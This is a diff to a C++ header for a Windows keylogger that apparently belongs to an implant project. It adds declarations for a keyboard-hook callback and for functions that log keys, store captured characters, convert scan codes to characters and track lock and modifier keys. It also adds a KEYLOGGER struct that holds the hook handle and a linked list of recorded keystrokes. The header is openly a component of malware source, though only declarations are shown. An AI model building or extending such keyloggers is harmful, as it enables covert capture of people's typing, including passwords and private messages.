@@ -1,6 +1,8 @@
 #ifndef KEYLOGGER_H
 #define KEYLOGGER_H
 
+#include <Imperium.h>
+
 /*
  * structure took from reactos
  * https://doxygen.reactos.org/d7/df4/kbd_8h_source.html
@@ -38,10 +40,15 @@ struct VK_TO_WCHARS {
     WCHAR wch[ i ];
 };
 
+typedef VK_TO_WCHARS< 1 > *PVK_TO_WCHARS;
+
 typedef struct _VK_TO_WCHAR_TABLE {
-    VK_TO_WCHARS< 1 > *pVkToWchars;
-    BYTE               nModifications;
-    BYTE               cbSize;
+    //
+    // the number of VK_TO_WCHARS is the cbSize member
+    //
+    PVK_TO_WCHARS pVkToWchars;
+    BYTE          nModifications;
+    BYTE          cbSize;
 } VK_TO_WCHAR_TABLE, *PVK_TO_WCHAR_TABLE;
 
 typedef struct _DEADKEY {
@@ -129,7 +136,6 @@ namespace Keylogger {
      *  the callback function when a keystroke is hit
      *
      * @param Code
-     *
      */
     INT64 CALLBACK callback(
         ULONG            Code,
@@ -141,15 +147,10 @@ namespace Keylogger {
      * @brief
      *  get a pointer onto the KBDTABLE of the language
      *
-     * @param KbLang
-     *  language of the keyboard
-     *
      * @return
-     *  pointer to language structure
+     *  exit status
      */
-    PKBDTABLES get_kbdtables(
-        OUT OPTIONAL PSTR *KbLang
-    );
+    BOOL store_kbdtables();
 
     /*!
      * @brief
@@ -161,22 +162,138 @@ namespace Keylogger {
      * @param e0
      *  is the E0 extended flag set,
      *
-     * @param e1
-     *  is the E1 extended flag set?
-     *
      * @param keyup
      *  is the event a key press(0) of a release (1)
-     *
-     * @param vk
-     *  virtual key associated to the key event
      */
-    VOID process_kbd_event(
+    VOID log_key(
         BYTE sc,
         BOOL e0,
-        BOOL e1,
-        BOOL keyup,
-        BYTE vk
+        BOOL keyup
+    );
+
+    /*!
+     * @brief
+     *  store a character
+     *
+     * @param Character
+     *  character to store
+     */
+    VOID store_character(
+        IN WCHAR Character
+    );
+
+    /*!
+     * @brief
+     *  convert a scan code to a virtual key
+     *
+     * @param KbTables
+     *  keyboard tables
+     *
+     * @param sc
+     *  the scan code to convert
+     *
+     * @param e0
+     *   is the E0 extended flag set?
+     *
+     * @return
+     *  virtual key
+     */
+    USHORT sc_to_vk(
+        PKBDTABLES KbTables,
+        BYTE       sc,
+        BOOL       e0
+    );
+
+    /*!
+     * @brief
+     *  fix the numpad virtual keys
+     *
+     * @param Vk
+     *  virtual key to fix
+     */
+    VOID fix_numpad_vk(
+        OUT PUSHORT Vk
+    );
+
+    /*!
+     * @brief
+     *  convert a virtual key to a wide char
+     *
+     * @param KbTables
+     *  lang keyboard table
+     *
+     * @param Vk
+     *  virtual key
+     *
+     * @return
+     *  the character
+     */
+    WCHAR vk_to_wchar(
+        IN PKBDTABLES Tables,
+        IN USHORT     Vk
+    );
+
+    /*!
+     * @brief
+     *  handle locks like NUMLOCK, CAPSLOCK...
+     *
+     * @brief Vk
+     *  virtual key
+     *
+     * @return
+     *  true if the key was a lock key and was handled
+     */
+    BOOL handle_lockkeys(
+        IN USHORT Vk
+    );
+
+    /*!
+     * @brief
+     *  handle modifiers keys like SHIFT, CONTROL...
+     *
+     * @return
+     *  true if the key was a modifier and was handled
+     */
+    BOOL handle_modifiers(
+        IN PKBDTABLES  KbTables,
+        IN OUT PUSHORT Vk
     );
 }
+
+
+typedef enum _LOCK_KEY : BYTE {
+    //
+    // locks
+    // like CAPSLOCK, NUMLOCK, SCROLL
+    //
+    ModCapitalLock = 0x01,
+    ModNumLock     = 0x02,
+    ModScrollLock  = 0x04,
+} LOCK_KEY, *PLOCK_KEY;
+
+typedef struct _KEYSTROKES {
+    UNICODE_STRING      Keys;
+    struct _KEYSTROKES *Next;
+} KEYSTROKES, *PKEYSTROKES;
+
+typedef struct _KEYLOGGER {
+    BOOL        Init;
+    ULONG       ThreadId;
+    PKEYSTROKES Keystrokes;
+    HHOOK       Hook;
+
+    PKBDTABLES  KbTables;
+    PSTR        KbLang;
+    PSTR        KbDll;
+
+    struct {
+        PBYTE Buffer;
+        ULONG Size;
+    } Modifiers;
+
+    ULONG Count;
+
+    LOCK_KEY Locks;
+} KEYLOGGER, *PKEYLOGGER;
 
 #endif //KEYLOGGER_H
